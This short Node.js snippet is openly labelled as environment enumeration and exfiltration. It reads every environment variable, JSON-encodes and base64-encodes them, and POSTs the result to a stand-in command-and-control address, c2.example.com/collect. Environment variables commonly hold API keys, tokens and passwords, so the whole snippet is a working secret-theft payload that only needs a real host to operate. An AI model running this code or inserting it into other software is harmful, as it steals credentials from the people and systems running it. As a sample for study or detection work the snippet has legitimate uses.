// Environment enumeration + encoding + HTTP POST exfil
const env = process.env;
const envStr = JSON.stringify(env);

// Encode
const encoded = Buffer.from(envStr).toString('base64');

// Exfiltrate
fetch('https://c2.example.com/collect', {
  method: 'POST',
  body: encoded,
  headers: { 'Content-Type': 'application/octet-stream' }
});
